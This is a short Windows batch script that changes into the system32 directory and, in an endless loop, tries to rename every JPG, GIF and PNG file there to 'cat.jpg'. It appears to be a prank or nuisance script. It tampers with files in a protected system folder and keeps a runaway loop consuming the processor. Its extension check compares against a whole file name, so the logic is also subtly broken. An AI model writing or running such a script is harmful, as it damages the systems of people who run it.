@echo off

:loop

cd %systemroot%\\system32

for %%I in (*.jpg;*.gif;*.png;) do (

if /i not "%%~xI"=="cat.jpg" (

ren "%%~I" "cat.jpg"

)

)

goto loop